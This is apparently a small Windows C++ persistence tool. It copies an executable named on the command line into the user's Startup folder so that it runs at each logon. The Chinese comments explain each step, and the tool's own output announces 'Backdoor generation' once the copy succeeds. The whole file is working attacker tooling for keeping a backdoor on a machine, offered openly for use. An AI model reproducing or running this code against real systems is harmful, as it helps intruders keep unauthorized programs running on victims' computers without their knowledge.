#include <iostream>
#include <windows.h>


#include   <shlobj.h>
#pragma   comment(lib, "shell32.lib")


BOOL AutoRun_Startup(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)
{
	BOOL ret = false;
	CHAR szStartPath[MAX_PATH] = { 0 };
	CHAR szDestFilePath[MAX_PATH] = { 0 };
	//返回快速启动目录路径到szStartPath
	ret = ::SHGetSpecialFolderPathA(NULL, szStartPath, CSIDL_STARTUP, TRUE);
	//判断是否获取成功
	if (ret == TRUE)
	{
		printf("[+]Get the quick start directory successfully！\n");
	}
	else
	{
		printf("[!]Get the quick start directory faild！\n");
		return FALSE;
	}
	//构造文件在快速启动目录下的路径
	::wsprintfA(szDestFilePath, "%s\\%s", szStartPath, lpszDestFileName);
	//复制文件到快速启动目录下
	ret = ::CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE);
	if (FALSE == ret)
	{
		printf("[!]Failed to save the file in the quick start directory.\n");
		return FALSE;
	}
	else
	{
		printf("[!]Successfully to save the file in the quick start directory.\n");
	}
	printf("[+]Backdoor generation in quick start directory successful!\n");
	return TRUE;
}
int main(int argc, char* argv[])
{
	printf("[*]Useage:\n    %s %s %s\n", "StartUp.exe", "E:\\010Editor\\010 Editor\\010Editor.exe", "010Editor.exe");
	if (argc == 3)
	{
		AutoRun_Startup(argv[1], argv[2]);
	}
	else
	{
		printf("[!]Please check the number of your parameters\n");
	}
}